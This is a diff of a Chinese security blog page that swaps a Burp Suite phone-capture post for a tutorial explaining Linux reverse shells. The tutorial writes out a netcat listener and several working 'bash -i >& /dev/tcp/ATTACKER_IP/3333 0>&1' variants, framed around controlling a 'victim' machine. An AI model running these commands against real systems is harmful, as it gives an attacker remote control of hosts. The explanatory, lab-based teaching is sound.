@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="hack-text,">
+  <meta name="keywords" content="linux-shell,">
 
 
 
@@ -81,26 +81,36 @@
 
 
 
-<meta name="description" content="目的实现对手机的数据包抓取 准备工作burpsuite，手机模拟器（夜神模拟器为例）">
-<meta name="keywords" content="hack-text">
+<meta name="description" content="0x01.写在前面Linux的反弹shell在前面的第一弹中了解了文件描述符和重定向，下来就开始对Linux反弹shell的更深层理解。">
+<meta name="keywords" content="linux-shell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="如何用burpsuite抓取手机上的包">
-<meta property="og:url" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/index.html">
+<meta property="og:title" content="Linux反弹shell（二）">
+<meta property="og:url" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/index.html">
 <meta property="og:site_name" content="On The Road">
-<meta property="og:description" content="目的实现对手机的数据包抓取 准备工作burpsuite，手机模拟器（夜神模拟器为例）">
+<meta property="og:description" content="0x01.写在前面Linux的反弹shell在前面的第一弹中了解了文件描述符和重定向，下来就开始对Linux反弹shell的更深层理解。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/2.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/3.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/4.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/5.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/6.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/7.png">
-<meta property="og:updated_time" content="2019-04-14T15:29:35.009Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/13.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/14.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/15.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/16.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/17.png">
+<meta property="og:updated_time" content="2019-04-26T12:13:28.481Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="如何用burpsuite抓取手机上的包">
-<meta name="twitter:description" content="目的实现对手机的数据包抓取 准备工作burpsuite，手机模拟器（夜神模拟器为例）">
-<meta name="twitter:image" content="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/2.png">
+<meta name="twitter:title" content="Linux反弹shell（二）">
+<meta name="twitter:description" content="0x01.写在前面Linux的反弹shell在前面的第一弹中了解了文件描述符和重定向，下来就开始对Linux反弹shell的更深层理解。">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/25/Linux反弹shell（二）/1.png">
 
 
 
@@ -130,13 +140,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/25/Linux反弹shell（二）/">
 
 
 
 
 
-  <title>如何用burpsuite抓取手机上的包 | On The Road</title>
+  <title>Linux反弹shell（二） | On The Road</title>
   
 
 
@@ -295,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/14/如何用burpsuite抓取手机上的包/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/25/Linux反弹shell（二）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Dog-river">
@@ -312,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">如何用burpsuite抓取手机上的包</h1>
+          <h1 class="post-title" itemprop="name headline">Linux反弹shell（二）</h1>
         
 
         <div class="post-meta">
@@ -324,8 +334,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-14T23:03:59+08:00">
-                2019-04-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-25T22:03:23+08:00">
+                2019-04-25
               </time>
             
 
@@ -367,19 +377,92 @@
       
 
       
-        <h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>实现对手机的数据包抓取</p>
-<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>burpsuite，手机模拟器（夜神模拟器为例）</p>
+        <h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01.写在前面"></a>0x01.写在前面</h1><p>Linux的反弹shell在前面的第一弹中了解了文件描述符和重定向，下来就开始对Linux反弹shell的更深层理解。</p>
 <a id="more"></a>
-<h1 id="建设过程"><a href="#建设过程" class="headerlink" title="建设过程"></a>建设过程</h1><h2 id="1-在手机模拟器上设置代理"><a href="#1-在手机模拟器上设置代理" class="headerlink" title="1.在手机模拟器上设置代理"></a>1.在手机模拟器上设置代理</h2><p>注意此处不能将代理设置为127.0.0.1因为127所指的是本机，但手机不能将代理设置在本机，它的目的是将包给电脑。所以此处设置成电脑所占据的无线ip！</p>
-<img src="/2019/04/14/如何用burpsuite抓取手机上的包/2.png">  
-<img src="/2019/04/14/如何用burpsuite抓取手机上的包/1.png">  
-<h2 id="2-在brupsuite上也设置代理"><a href="#2-在brupsuite上也设置代理" class="headerlink" title="2.在brupsuite上也设置代理"></a>2.在brupsuite上也设置代理</h2><img src="/2019/04/14/如何用burpsuite抓取手机上的包/3.png">  
-<h2 id="3-在手机模拟器端下载证书"><a href="#3-在手机模拟器端下载证书" class="headerlink" title="3.在手机模拟器端下载证书"></a>3.在手机模拟器端下载证书</h2><p>输入<a href="http://burp" target="_blank" rel="noopener">http://burp</a></p>
-<img src="/2019/04/14/如何用burpsuite抓取手机上的包/4.png">  
-<h2 id="4-更改证书后缀名（der——cer）"><a href="#4-更改证书后缀名（der——cer）" class="headerlink" title="4.更改证书后缀名（der——cer）"></a>4.更改证书后缀名（der——cer）</h2><img src="/2019/04/14/如何用burpsuite抓取手机上的包/5.png">  
-<h2 id="5-导入证书"><a href="#5-导入证书" class="headerlink" title="5.导入证书"></a>5.导入证书</h2><img src="/2019/04/14/如何用burpsuite抓取手机上的包/6.png">  
-<h2 id="6-抓包验证"><a href="#6-抓包验证" class="headerlink" title="6.抓包验证"></a>6.抓包验证</h2><p>抓包成功！</p>
-<img src="/2019/04/14/如何用burpsuite抓取手机上的包/7.png">  
+<h1 id="0x02-什么是反弹shell"><a href="#0x02-什么是反弹shell" class="headerlink" title="0x02.什么是反弹shell"></a>0x02.什么是反弹shell</h1><p>反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell（反弹shell）与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 </p>
+<h1 id="0X03-为什么要反弹shell"><a href="#0X03-为什么要反弹shell" class="headerlink" title="0X03. 为什么要反弹shell"></a>0X03. 为什么要反弹shell</h1><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p>
+<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做<strong>正向连接</strong>。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
+<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+<p>2.它的ip会动态改变，你不能持续控制。</p>
+<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
+<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫<strong>反弹连接</strong>。</p>
+<h1 id="0x04-反弹shell的本质是什么"><a href="#0x04-反弹shell的本质是什么" class="headerlink" title="0x04.反弹shell的本质是什么"></a>0x04.反弹shell的本质是什么</h1><p>我们可以先以一个linux 下的反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，掌握了反弹的本质，再多的方法其实只是换了包装而已。</p>
+<p><strong>实验环境：</strong></p>
+<p><strong>受害者：</strong></p>
+<p>RedHat Linux ——&gt; 192.168.10.10</p>
+<p><strong>攻击者：</strong></p>
+<p>Kali Linux   ——&gt; 192.168.10.54</p>
+<p>我们就以最常见的bash为例：<br>攻击者 机器上执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
+<p>受害者 机器上执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>你就会看到下图：</p>
+<img src="/2019/04/25/Linux反弹shell（二）/1.png"> 
+<p>可以看到在攻击机上出现了受害者机器的shell</p>
+<p>解释一下这条命令具体的含义：</p>
+<p><strong>1.bash -i</strong></p>
+<p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
+<p>2）-i 这个参数表示的是产生交互式的shell</p>
+<p><strong>2./dev/tcp/ip/port</strong></p>
+<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信 。</p>
+<p><strong>实例1：</strong></p>
+<p>我们输出字符串到这个文件里</p>
+<img src="/2019/04/25/Linux反弹shell（二）/2.png"> 
+<p>攻击机上的输出</p>
+<img src="/2019/04/25/Linux反弹shell（二）/3.png"> 
+<p><strong>实例2：</strong></p>
+<p>攻击机上的输入</p>
+<img src="/2019/04/25/Linux反弹shell（二）/4.png"> 
+<p>受害者机器上的输出</p>
+<img src="/2019/04/25/Linux反弹shell（二）/5.png"> 
+<p><strong>3.交互重定向</strong></p>
+<p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上<br> 在受害者机器上输入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.10.54/3333</span><br></pre></td></tr></table></figure>
+<p>示意图：</p>
+<img src="/2019/04/25/Linux反弹shell（二）/6.png"> 
+<p>如下图所示，任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。</p>
+<img src="/2019/04/25/Linux反弹shell（二）/7.png"> 
+<img src="/2019/04/25/Linux反弹shell（二）/8.png"> 
+<p>（cat命令用于回显输出，受控机将输出定向到了反弹给kali的那个shell中了）</p>
+<p>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p>
+<p>于是我们似乎还需要一条这样的指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/192.168.10.54/3333</span><br></pre></td></tr></table></figure>
+<p>示意图：</p>
+<img src="/2019/04/25/Linux反弹shell（二）/9.png"> 
+<p>这条指令的意思是将攻击者输入的命令输入给受害者的bash，自然就能执行了</p>
+<img src="/2019/04/25/Linux反弹shell（二）/10.png"> 
+<img src="/2019/04/25/Linux反弹shell（二）/11.png"> 
+<p>现在我们需要将两条指令结合起来：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>示意图：</p>
+<img src="/2019/04/25/Linux反弹shell（二）/12.png"> 
+<p><strong>由这张示意图可以很清楚地看到，输入0是由/dev/tcp/192.168.10.54/3333  输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.10.54/3333上，这就形成了一个回路，实现了我们远程交互式shell  的功能</strong></p>
+<p>如下图所示，我在攻击机上输入 ifconfig，查看到的是受害者的ip ，也就是说我们目前已经基本完成了一个反弹shell 的功能。</p>
+<img src="/2019/04/25/Linux反弹shell（二）/13.png"> 
+<p><strong>注意：</strong><br> 但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决</p>
+<img src="/2019/04/25/Linux反弹shell（二）/14.png"> 
+<p><strong>4. &gt;&amp;、&amp;&gt;</strong></p>
+<p>这个符号的作用就是混合输出（错误、正确输出都输出到一个地方）</p>
+<p>现在我们解决一下前面的问题：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<img src="/2019/04/25/Linux反弹shell（二）/15.png"> 
+<p>可以看到命令并没有回显在受害者机器上，我们的目的达成了</p>
+<img src="/2019/04/25/Linux反弹shell（二）/16.png"> 
+<p>当然我们也可以执行与之完全等价的指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>至此，这条经典的反弹shell的语句就分析完了，通过这次分析我们应该能理解反弹shell的本质。</p>
+<h1 id="0X05-bash的反弹shell-的语句怎么理解"><a href="#0X05-bash的反弹shell-的语句怎么理解" class="headerlink" title="0X05. bash的反弹shell 的语句怎么理解"></a>0X05. bash的反弹shell 的语句怎么理解</h1><h2 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a>1.方法一</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>和</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.10.54/3333 0&lt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，不过&lt;默认的是0，&gt;默认的是1。所以也可以出现（0&gt;，1&lt;）而对于这个文件描述符来讲并没有什么区别。</p>
+<h2 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.10.54/3333 &lt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>等价于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.10.54/3333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>示意图：</p>
+<img src="/2019/04/25/Linux反弹shell（二）/17.png"> 
+<p>上述的方法均是让0,1,2都指向/dev/tcp/192.168.10.54</p>
+<h1 id="0X06-写在最后"><a href="#0X06-写在最后" class="headerlink" title="0X06 .写在最后"></a>0X06 .写在最后</h1><p>反弹shell水真深，网上一搜就会有一堆代码，但其原理不是很好理解。但通过这两次的总结，了解文件描述符和重定向后，相信对其的理解一定有帮助吧。下一篇我会总结不同语言对Linux的反弹shell的提权。</p>
 
       
     </div>
@@ -397,7 +480,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/hack-text/" rel="tag"># hack-text</a>
+            <a href="/tags/linux-shell/" rel="tag"># linux-shell</a>
           
         </div>
       
@@ -410,8 +493,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/12/爬取猫眼电影TOP100与感悟/" rel="next" title="爬取猫眼电影TOP100与感悟">
-                <i class="fa fa-chevron-left"></i> 爬取猫眼电影TOP100与感悟
+              <a href="/2019/04/24/Linux反弹shell（一）/" rel="next" title="Linux反弹shell（一）">
+                <i class="fa fa-chevron-left"></i> Linux反弹shell（一）
               </a>
             
           </div>
@@ -419,10 +502,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/24/Linux反弹shell（一）/" rel="prev" title="Linux反弹shell（一）">
-                Linux反弹shell（一） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -557,7 +636,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#目的"><span class="nav-number">1.</span> <span class="nav-text">目的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#准备工作"><span class="nav-number">2.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#建设过程"><span class="nav-number">3.</span> <span class="nav-text">建设过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-在手机模拟器上设置代理"><span class="nav-number">3.1.</span> <span class="nav-text">1.在手机模拟器上设置代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-在brupsuite上也设置代理"><span class="nav-number">3.2.</span> <span class="nav-text">2.在brupsuite上也设置代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-在手机模拟器端下载证书"><span class="nav-number">3.3.</span> <span class="nav-text">3.在手机模拟器端下载证书</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-更改证书后缀名（der——cer）"><span class="nav-number">3.4.</span> <span class="nav-text">4.更改证书后缀名（der——cer）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-导入证书"><span class="nav-number">3.5.</span> <span class="nav-text">5.导入证书</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-抓包验证"><span class="nav-number">3.6.</span> <span class="nav-text">6.抓包验证</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-写在前面"><span class="nav-number">1.</span> <span class="nav-text">0x01.写在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-什么是反弹shell"><span class="nav-number">2.</span> <span class="nav-text">0x02.什么是反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0X03-为什么要反弹shell"><span class="nav-number">3.</span> <span class="nav-text">0X03. 为什么要反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-反弹shell的本质是什么"><span class="nav-number">4.</span> <span class="nav-text">0x04.反弹shell的本质是什么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0X05-bash的反弹shell-的语句怎么理解"><span class="nav-number">5.</span> <span class="nav-text">0X05. bash的反弹shell 的语句怎么理解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-方法一"><span class="nav-number">5.1.</span> <span class="nav-text">1.方法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-方法二"><span class="nav-number">5.2.</span> <span class="nav-text">2.方法二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0X06-写在最后"><span class="nav-number">6.</span> <span class="nav-text">0X06 .写在最后</span></a></li></ol></div>
             
 
           </div>
